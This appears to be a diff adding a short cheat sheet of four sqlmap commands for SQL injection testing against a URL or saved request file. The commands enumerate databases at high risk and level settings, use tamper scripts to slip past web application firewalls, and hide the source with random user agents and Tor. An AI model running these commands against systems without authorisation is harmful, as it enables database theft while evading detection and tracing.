@@ -1,0 +1,8 @@
+python sqlmap.py -u "URL" --batch
+
+
+python sqlmap.py -r sql.txt --current-db --level 5 --risk 3 --dbs --force-ssl
+
+python sqlmap.py -r sql.txt --dbs --risk=3 --level=3 --tamper=between
+
+python sqlmap.py -u "https://www.target.com/" --identify-waf --tamper="between,randomcase,space2comment" -v 3 --random-agent --tor
